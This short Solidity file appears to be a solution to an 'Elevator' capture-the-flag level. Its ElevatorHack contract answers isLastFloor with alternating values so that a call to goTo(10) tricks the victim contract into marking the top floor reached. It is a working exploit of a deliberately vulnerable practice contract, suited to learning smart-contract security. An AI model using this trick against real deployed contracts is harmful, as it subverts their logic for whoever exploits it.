// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '../LevelsContracts/#11 Elevator.sol';

contract ElevatorHack {
  bool public isLast = true;
  
  function isLastFloor(uint) public returns (bool) {
    isLast = ! isLast;
    return isLast;
  }

  function attack(address _victim) public {
    Elevator elevator = Elevator(_victim);
    elevator.goTo(10);
  }
}
